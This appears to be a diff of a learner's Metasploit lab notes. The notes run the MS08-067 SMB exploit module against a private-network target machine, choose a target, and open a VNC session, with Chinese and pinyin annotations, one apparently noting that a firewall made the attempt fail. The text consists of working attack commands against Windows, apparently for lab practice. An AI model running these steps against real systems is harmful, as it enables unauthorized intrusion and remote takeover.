@@ -1,9 +1,9 @@
 search ms08-067
 use exploit/windows/smb/ms08_067_netapi
-set RHOST 192.168.1.227  目标靶机
+set rhost 192.168.55.106  目标靶机
 show targets 显示有漏洞的操作系统
 set target 34
-exploit
+exploit     kailefanghuoqing shibai 
 run vnc
 
 下载靶机  
